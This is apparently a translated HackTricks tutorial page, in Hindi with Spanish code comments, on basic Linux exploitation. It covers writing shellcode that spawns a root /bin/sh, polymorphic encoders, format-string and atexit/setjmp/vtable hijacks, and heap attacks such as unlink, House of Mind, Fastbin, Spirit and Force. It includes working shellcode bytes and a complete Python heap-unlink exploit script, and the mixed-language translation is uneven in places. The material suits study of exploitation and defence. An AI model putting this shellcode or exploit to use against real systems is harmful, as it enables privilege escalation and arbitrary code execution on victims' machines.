# Linux Exploiting (Basic) (SPA)

{{#include ../../banners/hacktricks-training.md}}

## **2.SHELLCODE**

कर्नेल इंटरप्शन देखें: cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR_execve 11\
exit(0); // \_\_NR_exit 1

xor eax, eax ; eax को साफ करें\
xor ebx, ebx ; ebx = 0 क्योंकि कोई तर्क नहीं है\
mov al, 0x01 ; eax = 1 —> \_\_NR_exit 1\
int 0x80 ; syscall निष्पादित करें

**nasm -f elf assembly.asm** —> हमें एक .o देता है\
**ld assembly.o -o shellcodeout** —> हमें एक निष्पादन योग्य देता है जो असेंबली कोड से बना है और हम **objdump** के साथ ऑपकोड निकाल सकते हैं\
**objdump -d -Mintel ./shellcodeout** —> यह देखने के लिए कि यह वास्तव में हमारी शेलकोड है और ऑपकोड निकालने के लिए

**जांचें कि शेलकोड काम करता है**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
सिस्टम कॉल्स को सही तरीके से देखने के लिए, पिछले प्रोग्राम को संकलित करना चाहिए और सिस्टम कॉल्स को **strace ./PROGRAMA_COMPILADO** में दिखाई देना चाहिए।

शेलकोड बनाने के समय एक ट्रिक की जा सकती है। पहली निर्देश एक कॉल पर जंप होती है। कॉल मूल कोड को बुलाता है और इसके अलावा स्टैक में EIP डालता है। कॉल निर्देश के बाद, हमने आवश्यक स्ट्रिंग डाली है, इसलिए उस EIP के साथ हम स्ट्रिंग को इंगित कर सकते हैं और कोड को जारी रख सकते हैं।

ईजे **ट्रिक (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**EJ स्टैक का उपयोग करते हुए (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**ईजे एफएनएसटीएनवी:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Huter:**

यह एक छोटा कोड है जो एक प्रक्रिया से जुड़े मेमोरी पृष्ठों को स्कैन करता है ताकि वहां संग्रहीत shellcode को खोजा जा सके (यह shellcode में रखे गए किसी हस्ताक्षर की तलाश करता है)। यह उन मामलों में उपयोगी है जहां कोड इंजेक्ट करने के लिए केवल एक छोटा स्थान होता है।

**Shellcodes polimórficos**

यह एन्क्रिप्टेड शेल्स होते हैं जिनमें एक छोटा कोड होता है जो उन्हें डिक्रिप्ट करता है और उस पर कूदता है, Call-Pop ट्रिक का उपयोग करते हुए, यह एक **उदाहरण एन्क्रिप्टेड सीज़र** होगा:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
## **5.पूरक विधियाँ**

**मुरात तकनीक**

Linux में सभी प्रोग्राम 0xbfffffff से शुरू होकर मैप होते हैं।

Linux में एक नए प्रोसेस की स्टैक कैसे बनाई जाती है, इसे देखकर एक ऐसा एक्सप्लॉइट विकसित किया जा सकता है कि प्रोग्राम एक ऐसे वातावरण में शुरू हो, जिसकी एकमात्र वैरिएबल शेलकोड हो। इसका पता इस प्रकार लगाया जा सकता है: addr = 0xbfffffff - 4 - strlen(NOMBRE_ejecutable_completo) - strlen(shellcode)

इस प्रकार, शेलकोड के साथ पर्यावरण वैरिएबल का पता सरलता से प्राप्त किया जा सकता है।

यह execle फ़ंक्शन के कारण संभव है, जो एक ऐसा वातावरण बनाने की अनुमति देता है जिसमें केवल इच्छित पर्यावरण वैरिएबल हों।

##

###

###

###

###

### **फॉर्मेट स्ट्रिंग्स से बफर ओवरफ्लो**

**sprintf** एक फॉर्मेटेड स्ट्रिंग को एक **वैरिएबल** में **स्थानांतरित** करता है। इसलिए, आप एक स्ट्रिंग के **फॉर्मेटिंग** का दुरुपयोग कर सकते हैं ताकि एक **बफर ओवरफ्लो** उत्पन्न हो सके, जहां सामग्री को कॉपी किया जाता है।\
उदाहरण के लिए, पेलोड `%.44xAAAA` **44B+"AAAA" को वैरिएबल में लिखेगा**, जो बफर ओवरफ्लो का कारण बन सकता है।

### **\_\_atexit संरचनाएँ**

> [!CAUTION]
> आजकल इसे **शोषित करना बहुत अजीब है**।

**`atexit()`** एक फ़ंक्शन है जिसमें **अन्य फ़ंक्शन पैरामीटर के रूप में पास किए जाते हैं।** ये **फ़ंक्शन** तब **निष्पादित** होंगे जब **`exit()`** या **main** का **रिटर्न** किया जाएगा।\
यदि आप इन **फ़ंक्शनों** में से किसी के **पते** को शेलकोड की ओर मोड़ सकते हैं, तो आप **प्रोसेस** पर **नियंत्रण** प्राप्त कर सकते हैं, लेकिन यह वर्तमान में अधिक जटिल है।\
वर्तमान में, निष्पादित होने वाले **फ़ंक्शनों के पते** कई संरचनाओं के पीछे **छिपे** होते हैं और अंततः जिस पते की ओर वे इशारा करते हैं, वे फ़ंक्शनों के पते नहीं होते, बल्कि **XOR** और एक **रैंडम की** के साथ **एन्क्रिप्टेड** होते हैं। इसलिए वर्तमान में यह अटैक वेक्टर **कम से कम x86** और **x64_86** पर **बहुत उपयोगी नहीं है**।\
**एन्क्रिप्शन फ़ंक्शन** **`PTR_MANGLE`** है। **अन्य आर्किटेक्चर** जैसे m68k, mips32, mips64, aarch64, arm, hppa... **एन्क्रिप्शन** फ़ंक्शन को लागू नहीं करते क्योंकि यह **उसी** को लौटाता है जो इसे इनपुट के रूप में प्राप्त होता है। इसलिए ये आर्किटेक्चर इस वेक्टर द्वारा हमले के लिए संवेदनशील होंगे।

### **setjmp() & longjmp()**

> [!CAUTION]
> आजकल इसे **शोषित करना बहुत अजीब है**।

**`setjmp()`** **संदर्भ** (रजिस्टर) को **सहेजने** की अनुमति देता है।\
**`longjmp()`** संदर्भ को **पुनर्स्थापित** करने की अनुमति देता है।\
**सहेजे गए रजिस्टर** हैं: `EBX, ESI, EDI, ESP, EIP, EBP`\
जो होता है वह यह है कि EIP और ESP **`PTR_MANGLE`** फ़ंक्शन द्वारा पास किए जाते हैं, इसलिए इस हमले के लिए संवेदनशील आर्किटेक्चर वही हैं जो ऊपर हैं।\
ये त्रुटि पुनर्प्राप्ति या इंटरप्ट के लिए उपयोगी होते हैं।\
हालांकि, मैंने जो पढ़ा है, उसके अनुसार, अन्य रजिस्टर सुरक्षित नहीं हैं, **इसलिए यदि फ़ंक्शन में `call ebx`, `call esi` या `call edi`** है, तो नियंत्रण लिया जा सकता है। या आप EBP को भी संशोधित कर सकते हैं ताकि ESP को संशोधित किया जा सके।

**C++ में VTable और VPTR**

प्रत्येक क्लास का एक **Vtable** होता है, जो **विधियों के लिए पॉइंटर्स** का एक एरे होता है।

प्रत्येक **क्लास** का एक **VPtr** होता है, जो उसके क्लास के एरे का **पॉइंटर** होता है। VPtr प्रत्येक ऑब्जेक्ट के हेडर का हिस्सा होता है, इसलिए यदि **VPtr** का **ओवरराइट** किया जाता है, तो इसे एक डमी विधि की ओर **संशोधित** किया जा सकता है ताकि एक फ़ंक्शन को निष्पादित करने पर शेलकोड पर जाए।

## **निवारक उपाय और बचाव**

###

**Libsafe का प्रतिस्थापन**

इसे सक्रिय किया जाता है: LD_PRELOAD=/lib/libsafe.so.2\
या\
“/lib/libsave.so.2” > /etc/ld.so.preload

यह कुछ असुरक्षित फ़ंक्शनों के कॉल को अन्य सुरक्षित फ़ंक्शनों द्वारा इंटरसेप्ट करता है। यह मानकीकृत नहीं है। (केवल x86 के लिए, -fomit-frame-pointer के साथ संकलनों के लिए नहीं, स्थिर संकलनों के लिए नहीं, सभी असुरक्षित फ़ंक्शन सुरक्षित नहीं बनते और LD_PRELOAD suid बाइनरी में काम नहीं करता)।

**ASCII आर्मर्ड एड्रेस स्पेस**

यह 0x00000000 से 0x00ffffff तक साझा लाइब्रेरी को लोड करने में शामिल है ताकि हमेशा एक बाइट 0x00 हो। हालाँकि, यह वास्तव में लगभग कोई हमला नहीं रोकता है, और विशेष रूप से लिटिल एंडियन में।

**ret2plt**

यह एक ROP करने में शामिल है ताकि strcpy@plt (plt से) फ़ंक्शन को कॉल किया जाए और GOT में एंट्री की ओर इशारा किया जाए और उस फ़ंक्शन के पहले बाइट को कॉपी किया जाए जिसे आप कॉल करना चाहते हैं (system())। इसके बाद, GOT+1 की ओर इशारा करते हुए वही किया जाता है और system() का 2º बाइट कॉपी किया जाता है… अंत में, GOT में संग्रहीत पते को कॉल किया जाता है जो system() होगा।

**chroot() के साथ पिंजरे**

debootstrap -arch=i386 hardy /home/user —> एक विशिष्ट उपनिर्देशिका के तहत एक बुनियादी सिस्टम स्थापित करता है।

एक व्यवस्थापक इनमें से किसी एक पिंजरे से बाहर निकल सकता है: mkdir foo; chroot foo; cd ..

**कोड इंस्ट्रुमेंटेशन**

Valgrind —> त्रुटियों की खोज\
Memcheck\
RAD (रिटर्न एड्रेस डिफेंडर)\
Insure++

## **8 हीप ओवरफ्लो: बुनियादी एक्सप्लॉइट**

**असाइन किया गया टुकड़ा**

prev_size |\
size | —हेडर\
\*mem | डेटा

**फ्री टुकड़ा**

prev_size |\
size |\
\*fd | अगले टुकड़े का पॉइंटर\
\*bk | पिछले टुकड़े का पॉइंटर —हेडर\
\*mem | डेटा

फ्री टुकड़े एक डबल लिंक्ड लिस्ट (बिन) में होते हैं और कभी भी दो फ्री टुकड़े एक साथ नहीं हो सकते (वे मिल जाते हैं)।

“size” में यह संकेत देने के लिए बिट होते हैं: यदि पिछले टुकड़े का उपयोग किया जा रहा है, यदि टुकड़ा mmap() के माध्यम से असाइन किया गया है और यदि टुकड़ा प्राथमिक एरेना से संबंधित है।

यदि एक टुकड़े को मुक्त करते समय कोई भी सन्निकट फ्री पाया जाता है, तो इन्हें unlink() मैक्रो के माध्यम से विलय किया जाता है और नए बड़े टुकड़े को frontlink() में भेजा जाता है ताकि इसे उचित बिन में डाला जा सके।

unlink(){\
BK = P->bk; —> नए टुकड़े का BK वही है जो पहले से फ्री था\
FD = P->fd; —> नए टुकड़े का FD वही है जो पहले से फ्री था\
FD->bk = BK; —> अगले टुकड़े का BK नए टुकड़े की ओर इशारा करता है\
BK->fd = FD; —> पिछले टुकड़े का FD नए टुकड़े की ओर इशारा करता है\
}

इसलिए यदि हम P->bk को शेलकोड के पते से और P->fd को GOT या DTORS में 12 से घटाकर संशोधित करने में सफल होते हैं, तो प्राप्त होता है:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor_end\_\_ - 12) + 12) = \&shellcode

और इस प्रकार, प्रोग्राम से बाहर निकलते समय शेलकोड निष्पादित होता है।

इसके अलावा, unlink() का 4वां कथन कुछ लिखता है और शेलकोड को इसके लिए मरम्मत की जानी चाहिए:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor_end\_\_ - 12) —> यह शेलकोड के 8वें बाइट से 4 बाइट लिखने का कारण बनता है, इसलिए शेलकोड का पहला निर्देश एक jmp होना चाहिए ताकि इसे छोड़ दिया जाए और शेलकोड के बाकी हिस्से की ओर ले जाया जा सके।

इसलिए एक्सप्लॉइट इस प्रकार बनाया जाता है:

buffer1 में हम शेलकोड डालते हैं, जो एक jmp से शुरू होता है ताकि यह nops या शेलकोड के बाकी हिस्से में गिर जाए।

शेलकोड के बाद हम अगले टुकड़े के prev_size और size के क्षेत्र तक पहुँचने के लिए भराई डालते हैं। इन स्थानों में हम 0xfffffff0 डालते हैं (इस प्रकार prev_size को ओवरराइट किया जाता है ताकि इसका बिट यह कहे कि यह फ्री है) और “-4“(0xfffffffc) size में (ताकि जब तीसरे टुकड़े में जांच की जाए कि क्या दूसरा वास्तव में फ्री था, यह संशोधित prev_size पर जाए जो उसे बताएगा कि यह फ्री है) -> इस प्रकार जब free() जांच करेगा, यह तीसरे के size पर जाएगा लेकिन वास्तव में यह दूसरे - 4 पर जाएगा और सोचेगा कि दूसरा टुकड़ा फ्री है। और फिर यह **unlink()** को कॉल करेगा।

unlink() को कॉल करते समय, यह P->fd के रूप में दूसरे टुकड़े के पहले डेटा का उपयोग करेगा, इसलिए वहां वह पता डाला जाएगा जिसे आप ओवरराइट करना चाहते हैं - 12 (क्योंकि FD->bk में यह FD में संग्रहीत पते में 12 जोड़ेगा)। और उस पते पर वह दूसरा पता डालेगा जो वह दूसरे टुकड़े में पाएगा, जिसे हमें शेलकोड के पते (P->bk झूठा) के रूप में दिलचस्पी होनी चाहिए।

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev_size = pack("\<I”, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo está libre esté a 1**

**fake_size = pack("\<I”, 0xfffffffc) #-4, para que piense que el “size” del 3º trozo está 4bytes detrás (apunta a prev_size) pues es ahí donde mira si el 2º trozo está libre**

**addr_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got_free = pack("\<I", 0x08048300 - 12) #Dirección de free() en la plt-12 (será la dirección que se sobrescrita para que se lanza la shellcode la 2º vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque sí**

**payload += prev_size + fake_size + got_free + addr_sc #Se modifica el 2º trozo, el got_free apunta a donde vamos a guardar la direccion addr_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

हम तीन लगातार टुकड़ों को नियंत्रित कर रहे हैं और इन्हें आरक्षित करने के क्रम में उलट दिया जाता है।

इस मामले में:

टुकड़ा c में शेलकोड रखा जाता है।

टुकड़ा a का उपयोग हम b को इस प्रकार ओवरराइट करने के लिए करते हैं कि size में PREV_INUSE बिट निष्क्रिय हो जाए ताकि यह सोचे कि टुकड़ा a फ्री है।

इसके अलावा, हम b के हेडर में size को इस प्रकार ओवरराइट करते हैं कि यह -4 हो।

इसलिए, प्रोग्राम यह सोचेगा कि “a” फ्री है और एक बिन में है, इसलिए यह unlink() को कॉल करेगा ताकि इसे अनलिंक किया जा सके। हालाँकि, चूंकि PREV_SIZE का हेडर -4 है। यह सोचेगा कि “a” का टुकड़ा वास्तव में b+4 में शुरू होता है। अर्थात, यह b+4 में एक unlink() करेगा, इसलिए b+12 में पॉइंटर “fd” होगा और b+16 में पॉइंटर “bk” होगा।

इस प्रकार, यदि हम bk में शेलकोड का पता डालते हैं और fd में “puts()”-12 का पता डालते हैं, तो हमें अपना पेलोड मिल जाएगा।

**फ्रंटलिंक तकनीक**

फ्रंटलिंक तब कहा जाता है जब कुछ मुक्त किया जाता है और इसके कोई भी सन्निकट टुकड़े फ्री नहीं होते, unlink() को नहीं कहा जाता है बल्कि सीधे frontlink() को कहा जाता है।

यह तब उपयोगी होता है जब हमले का malloc कभी मुक्त नहीं होता (free())।

आवश्यकताएँ:

एक बफर जो डेटा इनपुट फ़ंक्शन के साथ ओवरफ्लो हो सकता है।

एक बफर जो इसके बगल में है जिसे मुक्त किया जाना चाहिए और जिसके हेडर के fd क्षेत्र को पिछले बफर के ओवरफ्लो के कारण संशोधित किया जाएगा।

एक बफर जिसे मुक्त किया जाना है जिसका आकार 512 से बड़ा लेकिन पिछले बफर से छोटा होना चाहिए।

एक बफर जो चरण 3 से पहले घोषित किया गया है जो इस पर prev_size को ओवरराइट करने की अनुमति देता है।

इस प्रकार, दो mallocs में अनियंत्रित रूप से ओवरराइट करने और एक में नियंत्रित रूप से ओवरराइट करने में सफल होकर, हम एक एक्सप्लॉइट बना सकते हैं।

**double free() की संवेदनशीलता**

यदि एक ही पॉइंटर के साथ दो बार free() को कॉल किया जाता है, तो दो बिन एक ही पते की ओर इशारा करते हैं।

यदि किसी एक का फिर से उपयोग करना चाहते हैं, तो इसे बिना किसी समस्या के असाइन किया जाएगा। यदि किसी अन्य का उपयोग करना चाहते हैं, तो इसे उसी स्थान पर असाइन किया जाएगा, इसलिए हमारे पास “fd” और “bk” पॉइंटर्स होंगे जो पिछले आवंटन के डेटा के साथ झूठे होंगे।

**free() के बाद**

एक पहले मुक्त किया गया पॉइंटर बिना नियंत्रण के फिर से उपयोग किया जाता है।

## **8 हीप ओवरफ्लो: उन्नत एक्सप्लॉइट**

unlink() और FrontLink() की तकनीकें unlink() फ़ंक्शन को संशोधित करने पर हटा दी गईं।

**The house of mind**

कोड को मनमाने ढंग से निष्पादित करने के लिए केवल एक free() कॉल की आवश्यकता होती है। एक दूसरे टुकड़े की तलाश करना महत्वपूर्ण है जिसे एक पूर्ववर्ती द्वारा ओवरफ्लो किया जा सकता है और मुक्त किया जा सकता है।

एक free() कॉल public_fREe(mem) को कॉल करने का कारण बनती है, यह करता है:

mstate ar_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> वह पता लौटाता है जहां टुकड़ा शुरू होता है (mem-8)

…

ar_ptr = arena_for_chunk(p); —> chunk_non_main_arena(ptr)?heap_for_ptr(ptr)->ar_ptr:\&main_arena \[1]

…

\_int_free(ar_ptr, mem);

}

\[1] में, यह size फ़ील्ड को NON_MAIN_ARENA बिट की जांच करता है, जिसे बदला जा सकता है ताकि जांच true लौटाए और heap_for_ptr() को निष्पादित किया जा सके, जो “mem” पर एक and करता है, जिससे 2.5 कम महत्वपूर्ण बाइट्स 0 हो जाते हैं (हमारे मामले में 0x0804a000 से 0x08000000 छोड़ता है) और 0x08000000->ar_ptr (जैसे कि यह एक struct heap_info हो) तक पहुँचता है।

इस प्रकार, यदि हम 0x0804a000 पर एक टुकड़ा नियंत्रित कर सकते हैं और 0x081002a0 पर एक टुकड़ा मुक्त किया जा रहा है, तो हम 0x08100000 पर पहुँच सकते हैं और जो चाहें लिख सकते हैं, उदाहरण के लिए **0x0804a000**। जब यह दूसरा टुकड़ा मुक्त किया जाएगा, तो यह पाएगा कि heap_for_ptr(ptr)->ar_ptr वह है जो हमने 0x08100000 में लिखा है (क्योंकि 0x081002a0 पर and लागू किया गया है और वहां से पहले 4 बाइट्स का मान निकाला गया है, ar_ptr)।

इस प्रकार, \_int_free(ar_ptr, mem) को कॉल किया जाता है, अर्थात, **\_int_free(0x0804a000, 0x081002a0)**\
**\_int_free(mstate av, Void_t\* mem){**\
…\
bck = unsorted_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

जैसा कि हमने पहले देखा, हम av के मान को नियंत्रित कर सकते हैं, क्योंकि यह वही है जो हम उस टुकड़े में लिखते हैं जिसे मुक्त किया जाएगा।

जैसा कि unsorted_chunks को परिभाषित किया गया है, हम जानते हैं:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

इसलिए यदि हम av->bins\[2] में \_\_DTOR_END\_\_-12 का मान लिखते हैं, तो अंतिम निर्देश में \_\_DTOR_END\_\_ में दूसरे टुकड़े का पता लिखा जाएगा।

अर्थात, पहले टुकड़े में हमें शुरुआत में कई बार \_\_DTOR_END\_\_-12 का पता डालना होगा क्योंकि av->bins\[2] इसे निकालेगा।

जिस पते पर दूसरे टुकड़े का पता गिरता है, उसके अंतिम 5 ज़ीरो में हमें पहले टुकड़े का पता लिखना होगा ताकि heap_for_ptr() यह सोच सके कि ar_ptr पहले टुकड़े की शुरुआत में है और वहां से av->bins\[2] निकाले।

दूसरे टुकड़े में और पहले के माध्यम से हम prev_size को 0x0c के साथ और size को कुछ ऐसा डालते हैं जो -> NON_MAIN_ARENA को सक्रिय करता है।

इसके बाद, टुकड़ा 2 में nops का एक ढेर डालते हैं और अंत में शेलकोड।

इस प्रकार, \_int_free(TROZO1, TROZO2) को कॉल किया जाएगा और निर्देशों का पालन करते हुए \_\_DTOR_END\_\_ में TROZO2 के prev_size का पता लिखा जाएगा, जो शेलकोड पर कूद जाएगा।

इस तकनीक को लागू करने के लिए कुछ और आवश्यकताएँ पूरी होनी चाहिए जो पेलोड को थोड़ा और जटिल बनाती हैं।

यह तकनीक अब लागू नहीं है क्योंकि unlink के लिए लगभग वही पैच लागू किया गया था। यह जांचता है कि जिस नए स्थान की ओर इशारा किया जा रहा है, क्या वह भी उसी की ओर इशारा कर रहा है।

**Fastbin**

यह The house of mind का एक रूपांतर है।

हमें अगले कोड को निष्पादित करने के लिए पहुंचना महत्वपूर्ण है, जिसे \_int_free() फ़ंक्शन की पहली जांच के बाद पहुंचा जा सकता है।

fb = &(av->fastbins\[fastbin_index(size)] —> fastbin_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

इस प्रकार, यदि fb में एक फ़ंक्शन का पता GOT में रखा जाता है, तो इस पते पर ओवरराइट किया जाएगा। इसके लिए आवश्यक होगा कि एरेना dtors के पते के करीब हो। अधिक सटीक रूप से, av->max_fast उस पते पर होना चाहिए जिसे हम ओवरराइट करने जा रहे हैं।

चूंकि The House of Mind में यह देखा गया था कि हम av के स्थान को नियंत्रित कर सकते हैं।

तो यदि हम size फ़ील्ड में 8 + NON_MAIN_ARENA + PREV_INUSE डालते हैं —> fastbin_index() हमें fastbins\[-1] लौटाएगा, जो av->max_fast की ओर इशारा करेगा।

इस मामले में av->max_fast वह पता होगा जो ओवरराइट किया जाएगा (न कि जिस पर यह इशारा करता है, बल्कि वह स्थिति जो ओवरराइट की जाएगी)।

इसके अलावा, यह सुनिश्चित करना होगा कि मुक्त किए गए टुकड़े का सन्निकट टुकड़ा 8 से बड़ा हो -> चूंकि हमने कहा है कि मुक्त किए गए टुकड़े का आकार 8 है, इस झूठे टुकड़े में हमें केवल 8 से बड़ा आकार डालना होगा (जैसा कि शेलकोड मुक्त किए गए टुकड़े में जाएगा, पहले एक jmp डालना होगा जो nops में गिरता है)।

इसके अलावा, वही झूठा टुकड़ा av->system_mem से छोटा होना चाहिए। av->system_mem 1848 बाइट्स आगे है।

\_DTOR_END\_ के शून्य और GOT में कुछ पते के कारण, इन खंडों में से कोई भी ओवरराइट करने के लिए उपयुक्त नहीं है, इसलिए चलिए देखते हैं कि हम fastbin को स्टैक पर हमला करने के लिए कैसे लागू कर सकते हैं।

हमले का एक और तरीका **av** को स्टैक की ओर पुनर्निर्देशित करना है।

यदि हम size को 8 के बजाय 16 में संशोधित करते हैं, तो: fastbin_index() हमें fastbins\[0] लौटाएगा और हम इसका उपयोग स्टैक को ओवरराइट करने के लिए कर सकते हैं।

इसके लिए, स्टैक में कोई कैनरी या अजीब मान नहीं होना चाहिए, वास्तव में हमें इस पर होना चाहिए: 4 बाइट्स शून्य + EBP + RET

4 बाइट्स शून्य की आवश्यकता है ताकि **av** इस पते पर हो और **av** का पहला तत्व वह म्यूटेक्स होना चाहिए जिसका मान 0 होना चाहिए।

**av->max_fast** EBP होगा और यह एक मान होगा जो हमें प्रतिबंधों को बायपास करने में मदद करेगा।

**av->fastbins\[0]** को **p** के पते के साथ ओवरराइट किया जाएगा और यह RET होगा, इस प्रकार यह शेलकोड पर कूद जाएगा।

इसके अलावा, **av->system_mem** (स्टैक में स्थिति से 1484 बाइट्स ऊपर) में बहुत सारी बर्बादी होगी जो हमें जांच को बायपास करने की अनुमति देगी।

इसके अलावा, यह सुनिश्चित करना होगा कि मुक्त किए गए टुकड़े का सन्निकट टुकड़ा 8 से बड़ा हो -> चूंकि हमने कहा है कि मुक्त किए गए टुकड़े का आकार 16 है, इस झूठे टुकड़े में हमें केवल 8 से बड़ा आकार डालना होगा (जैसा कि शेलकोड मुक्त किए गए टुकड़े में जाएगा, पहले एक jmp डालना होगा जो nops में गिरता है जो नए झूठे टुकड़े के size क्षेत्र के बाद आते हैं)।

**The House of Spirit**

इस मामले में हम एक ऐसा malloc पॉइंटर प्राप्त करने की कोशिश कर रहे हैं जिसे हमलावर द्वारा संशोधित किया जा सके (उदाहरण के लिए, यदि पॉइंटर स्टैक में एक संभावित ओवरफ्लो के नीचे हो)।

इस प्रकार, हम इस पॉइंटर को कहीं भी इशारा करने के लिए बना सकते हैं। हालाँकि, कोई भी स्थान मान्य नहीं है, झूठे टुकड़े का आकार av->max_fast से छोटा होना चाहिए और विशेष रूप से भविष्य में malloc() के लिए अनुरोधित आकार के बराबर होना चाहिए +8। इसलिए, यदि हम जानते हैं कि इस संवेदनशील पॉइंटर के बाद malloc(40) को कॉल किया जाएगा, तो झूठे टुकड़े का आकार 48 होना चाहिए।

यदि उदाहरण के लिए, प्रोग्राम उपयोगकर्ता से एक संख्या पूछता है, तो हम 48 दर्ज कर सकते हैं और malloc के संशोधित पॉइंटर को अगले 4 बाइट्स (जो भाग्य से EBP से संबंधित हो सकते हैं, इस प्रकार 48 पीछे रह जाता है, जैसे कि यह आकार का हेडर हो) की ओर इशारा कर सकते हैं। इसके अलावा, पता ptr-4+48 को कई शर्तों को पूरा करना चाहिए (इस मामले में ptr=EBP), अर्थात्, 8 < ptr-4+48 < av->system_mem।

यदि यह पूरा होता है, तो जब अगली malloc को कॉल किया जाएगा, जिसे हमने कहा था कि वह malloc(40) है, तो उसे EBP के पते के रूप में असाइन किया जाएगा। यदि हमलावर यह भी नियंत्रित कर सकता है कि इस malloc में क्या लिखा गया है, तो वह EBP और EIP दोनों को उस पते के साथ ओवरराइट कर सकता है जो वह चाहता है।

मुझे लगता है कि ऐसा इसलिए है क्योंकि जब इसे मुक्त किया जाएगा, तो free() यह रिकॉर्ड करेगा कि स्टैक के EBP को इंगित करने वाले पते पर एक टुकड़ा है जो नए malloc() के लिए आरक्षित करने के लिए एकदम सही आकार है, इसलिए इसे उस पते को असाइन करता है।

**The House of Force**

आवश्यक है:

- एक टुकड़े पर ओवरफ्लो जो वाइल्डरनेस को ओवरराइट करने की अनुमति देता है।
- उपयोगकर्ता द्वारा परिभाषित आकार के साथ malloc() को कॉल करना।
- एक malloc() कॉल करना जिसके डेटा उपयोगकर्ता द्वारा परिभाषित किए जा सकते हैं।

पहली बात यह है कि वाइल्डरनेस के टुकड़े के आकार को एक बहुत बड़े मान (0xffffffff) के साथ ओवरराइट किया जाता है, ताकि कोई भी पर्याप्त बड़ा मेमोरी अनुरोध \_int_malloc() में बिना हीप को बढ़ाए संसाधित किया जाए।

दूसरी बात यह है कि av->top को एक ऐसे मेमोरी क्षेत्र की ओर इशारा करने के लिए संशोधित किया जाता है जो हमलावर के नियंत्रण में है, जैसे कि स्टैक। av->top में \&EIP - 8 रखा जाएगा।

हमें av->top को इस प्रकार ओवरराइट करना होगा कि यह हमलावर के नियंत्रण में मेमोरी क्षेत्र की ओर इशारा करे:

victim = av->top;

remainder = chunck_at_offset(victim, nb);

av->top = remainder;

Victim वर्तमान वाइल्डरनेस टुकड़े के पते का मान रखता है (वर्तमान av->top) और remainder वास्तव में उस पते का योग है जो malloc() द्वारा अनुरोधित बाइट्स की मात्रा है। इसलिए यदि \&EIP-8 0xbffff224 पर है और av->top 0x080c2788 है, तो अगली malloc() के लिए av->top को $EIP-8 की ओर इशारा करने के लिए हमें नियंत्रित malloc में आरक्षित करने की मात्रा होगी:

0xbffff224 - 0x080c2788 = 3086207644।

इस प्रकार, av->top में संशोधित मान रखा जाएगा और अगली malloc EIP की ओर इशारा करेगा और इसे ओवरराइट कर सकेगा।

